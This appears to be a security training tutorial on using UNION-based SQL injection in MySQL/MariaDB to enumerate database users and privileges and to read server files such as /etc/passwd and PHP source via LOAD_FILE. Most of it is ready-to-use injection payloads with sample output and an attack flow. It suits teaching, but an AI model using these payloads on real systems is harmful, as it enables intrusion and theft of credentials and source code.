
# Reading Files via SQL Injection

In addition to extracting data from databases and tables, SQL Injection can also be abused to interact directly with the underlying operating system. One of the most powerful capabilities is reading files from the server. In some situations, attackers may even write files to disk and achieve Remote Code Execution (RCE).

This technique depends heavily on database privileges. Modern DBMS platforms restrict file operations to highly privileged users because reading or writing files can completely compromise the server.

---

# Understanding Database Privileges

Reading files is usually easier than writing files, but both operations still require specific database privileges.

In MySQL/MariaDB, the important privilege is:

```sql
FILE
````

A user with the `FILE` privilege can:

* Read files from the operating system
* Load files into database tables
* Potentially write files to the server

Before attempting file access, attackers first enumerate:

1. Current database user
2. User privileges
3. Whether FILE privilege exists

---

# Identifying the Current Database User

The first step is determining which database account the application is using.

Common queries:

```sql
SELECT USER()
```

```sql
SELECT CURRENT_USER()
```

```sql
SELECT user FROM mysql.user
```

---

# UNION Injection Example

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or:

```sql
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
```

---

# Example Result

```text
root@localhost
```

If the database user is `root`, this is highly significant because the root database account usually has administrative privileges.

---

# Enumerating User Privileges

After identifying the database user, the next step is checking privileges.

---

# Checking Super Privileges

```sql
SELECT super_priv FROM mysql.user
```

UNION Injection payload:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

To filter only the root account:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 
FROM mysql.user 
WHERE user="root"-- -
```

---

# Example Result

```text
Y
```

`Y` means:

```text
YES → Superuser privileges enabled
```

This indicates the account has administrative-level permissions.

---

# Enumerating All User Privileges

Another useful table is:

```sql
information_schema.user_privileges
```

Query:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 
FROM information_schema.user_privileges-- -
```

Filter only the root user:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 
FROM information_schema.user_privileges 
WHERE grantee="'root'@'localhost'"-- -
```

```text

```

Once FILE privilege is confirmed, attackers can start reading files from the operating system.

# Reading Files with LOAD_FILE()

MySQL/MariaDB provides a function called:

```sql
LOAD_FILE()
```

This function reads files directly from disk.

Syntax:

```sql
SELECT LOAD_FILE('/path/to/file');
```

---

# Reading `/etc/passwd`

Example:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

UNION Injection payload:

```sql
cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

---

# Example Output

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
```

This confirms the SQL Injection vulnerability can access operating system files.

---

# Important Note

The file can only be read if:

* The MySQL process has OS-level read permissions
* The database user has FILE privilege

Without both conditions, `LOAD_FILE()` returns NULL.

---

# Reading Application Source Code

Attackers often attempt to read:

* PHP source files
* Configuration files
* Database credentials
* API keys
* SSH keys

---

# Example: Reading `search.php`

Suppose:

* Current page is `search.php`
* Apache web root is:

```text
/var/www/html/
```

Payload:

```sql
cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
```

---

# Why Source Code Disclosure is Dangerous

Reading source code may expose:

* Database credentials
* Hardcoded passwords
* API tokens
* Hidden endpoints
* Internal logic
* Additional vulnerabilities

This can often lead to:

```text
Full application compromise
```

# Typical Attack Flow

```text
1. Identify SQL Injection
2. Enumerate database user
3. Enumerate privileges
4. Confirm FILE privilege
5. Read sensitive files
6. Extract credentials/source code
7. Escalate access
```

---

# Key Functions and Tables

| Item                                 | Purpose              |
| ------------------------------------ | -------------------- |
| `USER()`                             | Current DB user      |
| `CURRENT_USER()`                     | Active DB account    |
| `mysql.user`                         | User privilege table |
| `information_schema.user_privileges` | Enumerate privileges |
| `LOAD_FILE()`                        | Read OS files        |

---

# Important Security Impact

File-read vulnerabilities through SQL Injection can lead to:

* Source code disclosure
* Credential leakage
* Configuration disclosure
* Internal network information leakage
* Remote code execution
* Full server compromise

This is why SQL Injection remains one of the most dangerous web vulnerabilities.
